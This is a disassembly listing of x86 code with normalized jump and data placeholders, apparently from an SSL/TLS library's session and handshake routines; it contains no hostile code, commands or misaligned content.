test bh 0x2
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xd8 ]
mov ecx [ eax + 0x28 ]
test ecx ecx
je r-xdata
push ebp
push eax
call sub_1000f690
add esp 0x8
test eax eax
je r-xdata
mov eax [ esi + 0xd8 ]
mov eax [ eax + 0x48 ]
mov edx [ esi + 0xd8 ]
mov eax [ edx + 0x3c ]
jmp r-xdata
mov ecx [ esi + 0xbc ]
push 0x7c5
push r--data
push 0xe
add ecx 0x9c
push 0x1
push ecx
call sub_1001f5f0
mov eax [ esi + 0xbc ]
mov edx [ esi + 0xd8 ]
push eax
push esi
call [ edx + 0x28 ]
add esp 0x1c
test eax eax
jne r-xdata
push 0x0
call time
mov ecx [ esi + 0xd8 ]
push eax
push ecx
call sub_1000f9c0
add esp 0xc
cmp al 0xff
jne r-xdata
mov ecx [ esi + 0xbc ]
push ecx
call sub_1000f8e0
add esp 0x4
sub_1000e6d0
push esi
push edi
mov edi [ esp + 0xc ]
mov esi [ edi + 0x14 ]
test esi esi
jne r-xdata
mov eax [ edi + 0x10 ]
cmp esi eax
jne r-xdata
call sub_10024a80
push eax
call sub_100207d0
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push 0x0
push 0x0
push 0x1
push esi
call sub_10020c60
push 0x0
push 0x1
push 0x75
push esi
call sub_10020bc0
add esp 0x20
test eax eax
jne r-xdata
push eax
call sub_10020e30
add esp 0x4
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] esi
jmp r-xdata
pop edi
pop esi
retn
mov eax [ esp + 0x10 ]
test eax eax
mov eax [ edi + 0x10 ]
je r-xdata
push 0x97f
push r--data
push 0x7
push 0xb8
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
cmp eax esi
jne r-xdata
cmp eax esi
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
push esi
call sub_10020e30
add esp 0x4
mov [ edi + 0x10 ] eax
push eax
push esi
call sub_10020d90
add esp 0x8
mov [ edi + 0x10 ] eax
mov eax 0x1
pop edi
pop esi
retn
sub_1000e790
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
pop esi
retn
mov ecx [ esi + 0x10 ]
cmp eax ecx
jne r-xdata
mov eax [ esi + 0x14 ]
push eax
call sub_10020880
add esp 0x4
mov [ esi + 0x14 ] 0x0
push ecx
call sub_10020e30
add esp 0x4
mov [ esi + 0x10 ] eax
sub_1000e820
mov eax 0x14
call sub_1001d0d0
push ebp
push esi
push edi
xor edi edi
push edi
mov [ esp + 0x14 ] edi
call time
mov [ esp + 0x18 ] eax
push edi
push edi
lea eax [ esp + 0x20 ]
push 0x4
push eax
mov [ esp + 0x20 ] edi
call sub_10021890
add esp 0x14
call sub_1001df60
push edi
call [ SetLastError@IAT ]
mov ebp [ esp + 0x24 ]
mov eax [ ebp + 0xcc ]
cmp eax edi
jne r-xdata
mov edi eax
mov [ esp + 0xc ] edi
mov ecx [ ebp + 0xd8 ]
mov eax [ ecx + 0x9c ]
cmp eax edi
je r-xdata
push ebp
call sub_1000d0d0
add esp 0x4
push ebp
call sub_1000e7d0
add esp 0x4
test ah 0x40
je r-xdata
push ebx
mov ebx [ ebp + 0x1c ]
inc ebx
push ebp
mov [ ebp + 0x1c ] ebx
call sub_1000e7d0
add esp 0x4
test ah 0x30
je r-xdata
cmp eax 0x4000
je r-xdata
cmp eax 0x1220
jge r-xdata
mov eax [ ebp + 0x34 ]
cmp eax 0x1221
mov ebx eax
jg r-xdata
mov eax [ ebp + 0xbc ]
test eax eax
jne r-xdata
cmp eax 0x5000
jne r-xdata
push 0x7
push ebp
call sub_10019b60
add esp 0x8
cmp eax 0x7
je r-xdata
cmp eax 0x1003
jg r-xdata
push 0x79
push r--data
push 0xdd
test edi edi
mov [ ebp + 0x24 ] 0x0
je r-xdata
push 0xaf
push r--data
push 0xff
jmp r-xdata
mov esi [ ebp + 0x4c ]
mov eax esi
mov ebx [ eax ]
mov di [ eax + 0x4 ]
mov [ esp + 0x20 ] di
mov cl [ eax + 0x6 ]
mov al [ esi ]
test al 0x80
mov [ esp + 0x22 ] cl
je r-xdata
mov esi eax
cmp eax 0x1210
jl r-xdata
je r-xdata
test edi edi
je r-xdata
push eax
call sub_1001dca0
add esp 0x4
mov eax [ ebp + 0x3c ]
mov [ ebp + 0x4 ] 0x1000
test eax eax
jne r-xdata
push 0x1
push 0x10
push ebp
call edi
add esp 0xc
push 0x75
push 0x14
call sub_1001de60
add esp 0x14
cmp al 0x16
mov dl 0x3
jne r-xdata
cmp [ esi + 0x2 ] 0x4
jne r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ esp + 0x14 ]
dec edx
pop ebx
test eax eax
mov [ ebp + 0x1c ] edx
je r-xdata
xor edi edi
jmp r-xdata
cmp eax 0x1211
jg r-xdata
cmp eax 0x1000
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebp
add esp 0x14
retn
push esi
push 0x1002
push ebp
call edi
add esp 0xc
push ebp
call sub_10014540
add esp 0x4
test eax eax
je r-xdata
call sub_1001dc60
mov esi eax
test esi esi
mov [ esp + 0x14 ] esi
je r-xdata
cmp al 0x15
jne r-xdata
cmp [ esi + 0x1 ] dl
jne r-xdata
mov cl [ esi + 0x5 ]
test cl cl
jne r-xdata
push ebp
mov [ ebp + 0x30 ] 0x0
call sub_1000ed90
mov esi eax
add esp 0x4
test esi esi
jle r-xdata
jmp r-xdata
or esi 0xffffffff
push ebp
call sub_1001a5e0
mov eax [ ebp + 0xd8 ]
mov [ ebp + 0x34 ] 0x1210
add esp 0x4
inc [ eax + 0x34 ]
push 0x4000
push esi
call sub_1001dce0
add esp 0x8
test eax eax
je r-xdata
push 0x259
push r--data
push 0xfc
cmp [ esi + 0x1 ] dl
jne r-xdata
mov cl [ esi + 0x2 ]
test cl cl
je r-xdata
cmp [ esi + 0x6 ] 0x2
jne r-xdata
mov [ ebp + 0x34 ] 0x1220
jmp r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x10 ]
push 0x0
push 0x0
push 0xb
push edx
call sub_10020c60
add esp 0x10
mov [ ebp + 0x3c ] esi
mov [ esp + 0x14 ] 0x0
mov al [ esi + 0x2 ]
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ ebp + 0xf4 ] 0x1000000
je r-xdata
mov eax [ ebp + 0xdc ]
mov [ ebp + 0x44 ] 0x0
test eax eax
je r-xdata
mov esi [ ebp + 0x34 ]
cmp esi ebx
je r-xdata
mov al [ esi + 0x3 ]
test al al
jne r-xdata
cmp al 0x1
jne r-xdata
push 0x1
push ebp
call sub_1000e6d0
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp + 0x54 ]
push ebp
test eax eax
jne r-xdata
push 0x1d5
push r--data
push 0x102
jmp r-xdata
push 0x1
push 0x1001
push ebp
mov [ ebp + 0x34 ] ebx
call edi
add esp 0xc
mov [ ebp + 0x34 ] esi
jmp r-xdata
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edi [ esp + 0x10 ]
or esi 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x58 ]
mov ecx 0x7
mov [ ebp + 0x34 ] 0x1120
mov [ ebp + 0x38 ] 0xf0
mov [ ebp + 0x50 ] ecx
mov eax [ edx + 0xe0 ]
mov dl [ esp + 0x22 ]
mov [ ebp + 0x4c ] eax
mov [ eax ] ebx
mov [ eax + 0x4 ] di
mov [ eax + 0x6 ] dl
mov eax [ ebp + 0x58 ]
mov [ eax + 0xec ] ecx
mov ecx [ ebp + 0x58 ]
mov [ ecx + 0xe8 ] 0x0
mov al [ esi + 0x2 ]
test al al
jne r-xdata
call sub_10019740
add esp 0x4
call sub_10019610
add esp 0x4
test eax eax
je r-xdata
push 0x77
push 0x14
call sub_1001de60
add esp 0x14
mov eax [ ebp + 0xcc ]
test eax eax
jne r-xdata
cmp al 0x1
jne r-xdata
test [ ebp + 0xf4 ] 0x2000000
jne r-xdata
mov ecx [ ebp + 0x3c ]
push 0x3fff
push ecx
call sub_1001dd90
add esp 0x8
test eax eax
jne r-xdata
push ebp
call sub_10011390
add esp 0x4
jmp r-xdata
xor edx edx
mov dh [ esi + 0x5 ]
mov dl [ esi + 0x6 ]
push edx
push 0x4004
push ebp
call eax
add esp 0xc
mov ecx [ ebp + 0xd8 ]
mov eax [ ecx + 0x9c ]
test eax eax
je r-xdata
push 0x236
push r--data
push 0x102
jmp r-xdata
test [ ebp + 0xf4 ] 0x4000000
jne r-xdata
mov [ ebp ] 0x300
call sub_10014d40
jmp r-xdata
mov eax [ ebp + 0x104 ]
mov [ ebp + 0x34 ] 0x1020
cmp eax 0x2
je r-xdata
push 0x1f1
push r--data
push 0x7
jmp r-xdata
mov ecx [ ebp + 0xf4 ]
mov edx [ ebp + 0x54 ]
and cl 0x2
neg cl
sbb ecx ecx
and ecx 0xfffffff0
add ecx 0x20
mov [ edx + 0x64 ] ecx
mov esi [ ebp + 0x58 ]
mov edi [ ebp + 0x54 ]
sub esi ecx
mov eax ecx
add esi 0xd8
add edi 0x68
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp + 0x18 ] 0x1
mov al [ esi + 0x6 ]
push 0x254
add eax 0x3e8
push r--data
push eax
jmp r-xdata
mov [ ebp ] 0x301
call sub_10014d10
mov edx eax
mov [ ebp + 0x8 ] eax
mov eax [ edx + 0x14 ]
mov eax [ ebp + 0x54 ]
mov dx [ esp + 0x20 ]
mov ecx 0x7
mov [ ebp + 0x38 ] 0xf0
mov [ ebp + 0x50 ] ecx
mov eax [ eax + 0x30 ]
mov [ ebp + 0x4c ] eax
mov [ eax ] ebx
mov [ eax + 0x4 ] dx
mov dl [ esp + 0x22 ]
mov [ eax + 0x6 ] dl
mov eax [ ebp + 0x54 ]
mov [ eax + 0x28 ] ecx
mov ecx [ ebp + 0x54 ]
mov [ ecx + 0x2c ] 0x0
mov edx [ ebp + 0x54 ]
mov [ edx + 0xd4 ] 0x1
call sub_10017ef0
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x14 ]
jmp r-xdata
mov edx [ ebp + 0x54 ]
mov [ edx + 0xc ] 0x1
push ebp
call sub_1000d8d0
mov edi [ esp + 0x14 ]
add esp 0x4
mov esi eax
jmp r-xdata
push 0x0
push ebp
mov [ ebp + 0x20 ] eax
mov [ ebp + 0x44 ] 0x0
call sub_1000f330
add esp 0x8
test eax eax
je r-xdata
test esi esi
jl r-xdata
sub_1000ed90
mov eax 0x14
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x20 ]
push esi
push edi
xor ecx ecx
mov eax [ ebp + 0xf4 ]
mov [ esp + 0x18 ] ecx
mov edi eax
not edi
shr edi 0x18
and edi 0x1
test eax 0x4000000
mov [ esp + 0x14 ] edi
jne r-xdata
test eax 0x2000000
jne r-xdata
mov [ esp + 0x18 ] 0x301
test eax 0x1000000
jne r-xdata
mov [ esp + 0x18 ] 0x300
jmp r-xdata
cmp [ ebp + 0x118 ] 0xffffffff
je r-xdata
mov [ esp + 0x14 ] ecx
mov edi ecx
cmp [ ebp + 0x110 ] ecx
je r-xdata
mov [ esp + 0x18 ] 0x2
jmp r-xdata
mov eax [ ebp + 0x3c ]
mov ebx [ eax + 0x4 ]
mov eax [ ebp + 0x34 ]
cmp eax 0x1210
mov [ esp + 0x1c ] ebx
jne r-xdata
mov [ esp + 0x14 ] ecx
mov edi ecx
push ebp
call sub_10019af0
mov esi eax
add esp 0x4
cmp esi 0x2
jl r-xdata
mov esi [ ebp + 0x58 ]
push ecx
add esi 0xb8
call time
mov ecx eax
mov edx eax
shr ecx 0x18
mov [ esi ] cl
inc esi
shr edx 0x10
mov [ esi ] dl
mov ecx eax
inc esi
push 0x1c
shr ecx 0x8
mov [ esi ] cl
inc esi
mov [ esi ] al
inc esi
push esi
call sub_10021970
add esp 0xc
test eax eax
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov eax [ ebp + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x14
retn
mov eax [ esp + 0x18 ]
cmp eax 0x301
jne r-xdata
mov ecx [ ebp + 0x68 ]
test edi edi
push ecx
push ebp
je r-xdata
cmp eax 0x300
jne r-xdata
mov [ esp + 0x28 ] 0x3
mov [ esp + 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x3c ]
lea edx [ esi - 0x5 ]
push edx
mov edx [ ecx + 0x4 ]
mov ecx [ esp + 0x24 ]
add edx 0x5
push edx
push 0x16
push ecx
push 0x1
call eax
add esp 0x1c
mov ecx [ ebp + 0x3c ]
lea edx [ esi - 0x2 ]
push edx
mov edx [ ecx + 0x4 ]
add edx 0x2
push edx
push 0x0
push 0x2
push 0x1
call eax
add esp 0x1c
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
cmp eax 0x2
jne r-xdata
mov [ esp + 0x28 ] 0x3
mov [ esp + 0x10 ] 0x0
jmp r-xdata
test edi edi
mov [ ebp + 0x104 ] eax
je r-xdata
push 0x118
push r--data
push 0xbf
jmp r-xdata
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x10 ] eax
mov cl [ esp + 0x28 ]
mov dl [ esp + 0x10 ]
add ebx 0x9
push sub_10012080
mov [ esp + 0x24 ] ebx
mov [ ebx ] cl
inc ebx
mov ecx 0x8
mov [ ebx ] dl
mov esi [ ebp + 0x58 ]
inc ebx
add esi 0xb8
mov edi ebx
add ebx 0x20
[ edi ] [ esi ]
mov [ ebx ] 0x0
inc ebx
lea eax [ ebx + 0x2 ]
push eax
push ebp
call sub_1000de10
add esp 0x4
push eax
push ebp
call sub_1000de70
add esp 0x10
test eax eax
jne r-xdata
mov dl [ esp + 0x28 ]
lea esi [ ebx + 0x2 ]
mov al [ esp + 0x10 ]
mov [ esp + 0x20 ] esi
lea edi [ esi + 0x9 ]
mov [ esi ] 0x1
inc esi
push 0x0
push edi
push ebp
mov [ esi ] dl
inc esi
mov [ esi ] al
inc esi
call sub_1000de10
add esp 0x4
push eax
push ebp
call sub_1000de70
add esp 0x10
test eax eax
jne r-xdata
push 0x74
push 0x14
call sub_1001de60
add esp 0x14
mov ecx eax
mov [ ebx + 0x1 ] al
sar ecx 0x8
mov [ ebx ] cl
mov edx [ ebp + 0xd8 ]
lea esi [ ebx + eax + 0x2 ]
mov eax [ edx + 0x98 ]
test eax eax
jne r-xdata
push 0x16c
push r--data
push 0xb5
push 0x74
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov ecx eax
mov [ esi + 0x1 ] al
sar ecx 0x8
mov [ esi ] cl
add esi 0x2
add edi eax
mov ecx 0x8
mov [ esi ] 0x0
mov [ esi + 0x1 ] 0x0
mov ebx [ ebp + 0xf4 ]
add esi 0x2
and bl 0x2
mov [ esp + 0x28 ] edi
neg bl
sbb ebx ebx
xor eax eax
and ebx 0xfffffff0
add ebx 0x20
mov edx ebx
mov [ esi + 0x1 ] bl
sar edx 0x8
mov [ esi ] dl
mov edi [ ebp + 0x58 ]
add edi 0xb8
push ebx
[ edi ]
mov eax [ ebp + 0x58 ]
sub eax ebx
add eax 0xd8
push eax
call sub_10021970
add esp 0x8
test eax eax
jle r-xdata
push 0x12f
push r--data
push 0xb5
push 0x74
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push eax
call sub_1001e7b0
add esp 0x4
mov ebx eax
xor ebx ebx
jmp r-xdata
mov esi [ ebp + 0x58 ]
mov edx [ esp + 0x28 ]
mov ecx ebx
sub esi ebx
mov eax ecx
add esi 0xd8
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x1c ]
sub ebx eax
and ecx 0x3
[ edi ] [ esi ]
lea ebx [ ebx + edx - 0x2 ]
mov ecx ebx
mov [ eax + 0x1 ] bl
sar ecx 0x8
or cl 0x80
lea edx [ ebx + 0x2 ]
mov [ eax ] cl
mov eax [ esp + 0x20 ]
push ebx
mov [ ebp + 0x44 ] edx
mov [ ebp + 0x48 ] 0x0
push eax
jmp r-xdata
mov edi [ esp + 0x1c ]
mov [ esi ] 0x0
inc esi
lea ecx [ edi + 0x4000 ]
push ecx
push esi
push ebp
call sub_10014680
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ecx [ ebp + 0xd8 ]
push edi
mov edx [ ecx + 0x98 ]
push edx
call sub_1001e7c0
mov al [ eax ]
add esp 0x8
mov [ esi ] al
inc esi
inc edi
cmp edi ebx
jl r-xdata
mov al bl
xor edi edi
inc al
mov [ esi ] al
inc esi
test ebx ebx
jle r-xdata
push ebp
call sub_1001a640
mov edi [ esp + 0x20 ]
add esp 0xc
mov [ ebp + 0x34 ] 0x1211
mov [ ebp + 0x48 ] 0x0
mov edx [ esp + 0x20 ]
mov ecx esi
lea ebx [ edi + 0x5 ]
sub ecx edx
mov edx ebx
mov [ esi ] 0x2a
mov eax ecx
mov [ edx ] 0x1
inc edx
shr eax 0x10
mov [ edx ] al
mov eax ecx
mov [ edx + 0x2 ] cl
add ecx 0x4
shr eax 0x8
cmp ecx 0x4000
mov [ edx + 0x1 ] al
jbe r-xdata
push 0x181
jmp r-xdata
mov al [ esp + 0x28 ]
lea edx [ edi + 0x1 ]
mov [ edi ] 0x16
mov [ edx ] al
mov al [ esp + 0x10 ]
inc edx
mov [ edx ] al
mov eax ecx
inc edx
sar eax 0x8
mov [ edx ] al
mov eax esi
sub eax edi
mov [ edx + 0x1 ] cl
mov [ ebp + 0x44 ] eax
add eax 0xfffffffb
push eax
mov [ ebp + 0x48 ] 0x0
push ebx
push 0x192
push r--data
push 0x44
sub_1000f1f0
call sub_10026680
push eax
call sub_10021a40
call sub_10026360
push eax
call sub_10021a40
call sub_10026060
push eax
call sub_10021a40
call sub_10025ef0
push eax
call sub_10021a40
call sub_10025cd0
push eax
call sub_10021a40
call sub_100259f0
push eax
call sub_10021a40
call sub_10025a00
push eax
call sub_10021a40
call sub_10025ab0
push eax
call sub_10021a40
call sub_10025970
push eax
call sub_10021a80
call sub_10025900
push eax
call sub_10021a80
push r--data
push 0x8001
push r--data
call sub_100257b0
push r--data
push 0x8001
push r--data
call sub_100257b0
add esp 0x40
call sub_100254d0
push eax
call sub_10021a80
push r--data
push 0x8001
push r--data
call sub_100257b0
push r--data
push 0x8001
push r--data
call sub_100257b0
call sub_10025460
push eax
call sub_10021a80
push r--data
push 0x8001
push r--data
call sub_100257b0
push r--data
push 0x8001
push r--data
call sub_100257b0
push r--data
push 0x8001
push r--data
call sub_100257b0
add esp 0x44
call sub_10025450
push eax
call sub_10021a80
add esp 0x4
call sub_10010af0
call sub_1000fc20
mov eax 0x1
retn
sub_1000f330
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
push 0x71
push r--data
push 0xd8
mov [ esp + 0x1c ] sub_1000f630
call sub_1001d4c0
mov ebx eax
xor esi esi
add esp 0xc
cmp ebx esi
jne r-xdata
mov ecx 0x36
xor eax eax
mov edi ebx
push esi
[ edi ]
mov eax 0x1
mov [ ebx + 0xa0 ] 0x130
mov [ ebx + 0x98 ] eax
mov [ ebx + 0x9c ] eax
call time
mov [ ebx + 0xa4 ] eax
lea eax [ ebx + 0xb8 ]
push eax
push ebx
push 0x3
mov [ ebx + 0xc0 ] esi
mov [ ebx + 0xc4 ] esi
mov [ ebx + 0xa8 ] esi
mov [ ebx + 0xc8 ] esi
call sub_1001f420
mov ebp [ esp + 0x2c ]
add esp 0x10
mov ecx [ ebp + 0xd8 ]
mov eax [ ecx + 0x24 ]
cmp eax esi
jne r-xdata
push 0x74
push r--data
push 0x41
push 0xbd
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov [ ebx + 0xa0 ] eax
mov eax [ ebp + 0xbc ]
cmp eax esi
je r-xdata
push ebp
call sub_1000d980
add esp 0x4
cmp [ esp + 0x20 ] esi
je r-xdata
push eax
call sub_1000f8e0
add esp 0x4
mov [ ebp + 0xbc ] esi
mov [ ebx + 0x44 ] esi
mov eax [ ebp ]
cmp eax 0x2
jne r-xdata
mov edx ecx
lea esi [ ebp + 0x9c ]
lea edi [ ebx + 0x6c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x98 ]
pop edi
mov [ ebx + 0x68 ] eax
mov ecx [ ebp ]
mov [ ebp + 0xbc ] ebx
pop esi
mov [ ebx ] ecx
mov [ ebx + 0x98 ] 0x0
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
push 0x125
push r--data
push 0x44
cmp eax 0x300
jne r-xdata
mov [ ebx ] eax
mov [ ebx + 0x44 ] 0x10
jmp r-xdata
cmp eax 0x301
jne r-xdata
mov [ ebx ] eax
jmp r-xdata
cmp [ ebp + 0x130 ] esi
je r-xdata
cmp eax 0xfeff
jne r-xdata
mov [ ebx ] eax
jmp r-xdata
mov [ ebx + 0x44 ] 0x20
push 0xea
push r--data
push 0xc
push 0x5
call sub_1001f5b0
mov eax [ ebp + 0xc0 ]
add esp 0x10
cmp eax esi
jne r-xdata
mov [ ebx + 0x44 ] esi
jmp r-xdata
push 0xdd
push r--data
push 0x103
jmp r-xdata
mov [ ebx ] eax
mov [ esp + 0x10 ] eax
mov edx [ ebp + 0xd8 ]
mov eax [ edx + 0xec ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x110 ]
cmp eax esi
je r-xdata
push 0xb5
push 0x14
call sub_1001de60
push ebx
call sub_1000f8e0
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov edx [ esp + 0x14 ]
test edx edx
je r-xdata
push 0xf6
push r--data
push 0x12d
jmp r-xdata
push 0xef
push r--data
push 0xc
push 0x6
call sub_1001f5b0
mov eax [ ebx + 0x44 ]
lea ecx [ esp + 0x24 ]
lea esi [ ebx + 0x48 ]
push ecx
push esi
push ebp
mov [ esp + 0x30 ] eax
call [ esp + 0x2c ]
add esp 0x1c
test eax eax
jne r-xdata
mov ecx [ ebp + 0x98 ]
cmp ecx 0x20
jbe r-xdata
push eax
call sub_100266f0
add esp 0x4
cmp eax esi
mov [ ebx + 0xc8 ] eax
jne r-xdata
push 0x100
push r--data
push 0x12f
jmp r-xdata
mov ecx [ ebx + 0x44 ]
cmp edx ecx
ja r-xdata
push 0x117
push r--data
push 0x44
push 0xb5
push 0x14
call sub_1001de60
push ebx
call sub_1000f8e0
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
jae r-xdata
mov [ ebx + 0x44 ] edx
cmp [ ebp ] 0x2
jne r-xdata
xor esi esi
push 0x10e
push r--data
push 0x12e
jmp r-xdata
sub ecx edx
lea edi [ ebx + edx + 0x48 ]
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
jmp r-xdata
mov eax [ ebx + 0x44 ]
push eax
push esi
push ebp
call sub_1000d4d0
add esp 0xc
test eax eax
je r-xdata
sub_1000f630
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi [ esp + 0x18 ]
mov eax [ esi ]
xor ebx ebx
push eax
push edi
call sub_10021970
add esp 0x8
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ebp [ esp + 0x14 ]
cmp ebx 0xa
jae r-xdata
inc ebx
cmp ebx 0xa
jae r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov edx [ esi ]
push edx
push edi
call sub_10021970
add esp 0x8
test eax eax
jg r-xdata
mov ecx [ esi ]
push ecx
push edi
push ebp
call sub_1000d4d0
add esp 0xc
test eax eax
je r-xdata
sub_1000f690
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
push 0x1dc
push r--data
mov ebp 0x1
push 0xe
lea eax [ edi + 0x9c ]
push ebp
push eax
call sub_1001f5f0
push 0x1df
push r--data
push 0xc
push 0x9
call sub_1001f5b0
mov esi [ esp + 0x38 ]
push edi
mov ecx [ esi + 0x10 ]
push ecx
call sub_1001fcf0
mov ebx eax
add esp 0x2c
test ebx ebx
je r-xdata
mov eax [ edi + 0xc4 ]
test eax eax
je r-xdata
cmp ebx edi
push ebx
je r-xdata
mov ecx [ esi + 0x18 ]
lea eax [ esi + 0x18 ]
test ecx ecx
jne r-xdata
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
call sub_1000f8e0
add esp 0x4
xor ebp ebp
jmp r-xdata
push esi
call sub_1000fb90
push ebx
call sub_1000f8e0
add esp 0xc
mov [ edi + 0xc4 ] ecx
mov [ ecx + 0xc0 ] edi
mov [ edi + 0xc0 ] eax
mov [ eax ] edi
jmp r-xdata
lea ecx [ esi + 0x1c ]
mov [ eax ] edi
mov [ ecx ] edi
mov [ edi + 0xc0 ] eax
mov [ edi + 0xc4 ] ecx
push edi
push esi
call sub_1000fb90
add esp 0x8
push 0x211
push r--data
push 0xc
push 0xa
call sub_1001f5b0
add esp 0x10
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x0
push 0x0
push 0x2b
push esi
call sub_1000dbd0
add esp 0x10
test eax eax
jle r-xdata
push 0x0
push 0x0
push 0x2b
push esi
call sub_1000dbd0
push 0x0
push 0x0
push 0x14
push esi
mov edi eax
call sub_1000dbd0
add esp 0x20
cmp eax edi
jle r-xdata
mov edi [ esi + 0x1c ]
test edi edi
je r-xdata
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov edx [ esi + 0x10 ]
push edi
push edx
call sub_1001ff80
add esp 0x8
cmp eax edi
jne r-xdata
mov eax [ esi + 0x10 ]
push edi
push eax
call sub_1001fe60
push edi
push esi
mov ebx eax
call sub_1000fb90
mov [ ebx + 0x8c ] ebp
mov eax [ esi + 0x2c ]
add esp 0x10
test eax eax
je r-xdata
push ebx
call sub_1000f8e0
mov edi [ esi + 0x54 ]
push 0x0
push 0x0
inc edi
push 0x2b
push esi
mov [ esi + 0x54 ] edi
call sub_1000dbd0
push 0x0
push 0x0
push 0x14
push esi
mov edi eax
call sub_1000dbd0
add esp 0x24
cmp eax edi
jg r-xdata
push ebx
push esi
call eax
add esp 0x8
sub_1000f830
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
xor ebp ebp
push edi
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push 0x221
push r--data
push 0xc
push 0x9
call sub_1001f5b0
mov ebx [ esp + 0x24 ]
push esi
mov eax [ ebx + 0x10 ]
push eax
call sub_1001ff80
mov edi eax
add esp 0x18
cmp edi esi
jne r-xdata
push 0x229
push r--data
push 0xc
push 0xa
call sub_1001f5b0
add esp 0x10
test ebp ebp
je r-xdata
mov ecx [ ebx + 0x10 ]
push esi
push ecx
mov ebp 0x1
call sub_1001fe60
push esi
push ebx
mov edi eax
call sub_1000fb90
add esp 0x10
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
mov [ edi + 0x8c ] 0x1
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
push edi
call sub_1000f8e0
add esp 0x4
push edi
push ebx
call eax
add esp 0x8
sub_1000f8e0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0x23f
push r--data
push 0xe
lea eax [ esi + 0x9c ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
lea ecx [ esi + 0xb8 ]
push ecx
push esi
push 0x3
call sub_1001f490
lea edx [ esi + 0x8 ]
push 0x8
push edx
call sub_10026870
lea eax [ esi + 0x14 ]
push 0x30
push eax
call sub_10026870
lea ecx [ esi + 0x48 ]
push 0x20
push ecx
call sub_10026870
mov eax [ esi + 0x90 ]
add esp 0x24
test eax eax
je r-xdata
mov eax [ esi + 0x94 ]
test eax eax
je r-xdata
push eax
call sub_10011010
add esp 0x4
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call sub_10022870
add esp 0x4
mov eax [ esi + 0xc8 ]
test eax eax
je r-xdata
push eax
call sub_1001e780
add esp 0x4
mov eax [ esi + 0xcc ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
push 0xd8
push esi
call sub_10026870
push esi
call sub_1001d740
add esp 0xc
push eax
call sub_1001d740
add esp 0x4
sub_1000f9c0
mov eax 0xc
call sub_1001d0d0
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ eax + 0x10 ]
test eax eax
mov [ esp + 0x8 ] eax
je r-xdata
add esp 0xc
retn
mov eax [ esp + 0x14 ]
push esi
push 0x2e7
push r--data
push 0xc
push 0x9
mov [ esp + 0x18 ] eax
call sub_1001f5b0
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x14 ]
push ecx
push sub_1000fa40
mov esi [ eax + 0x20 ]
mov [ eax + 0x20 ] 0x0
mov edx [ esp + 0x24 ]
push edx
call sub_10020000
mov eax [ esp + 0x28 ]
push 0x2ec
push r--data
push 0xc
push 0xa
mov [ eax + 0x20 ] esi
call sub_1001f5b0
add esp 0x2c
pop esi
sub_1000fa40
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
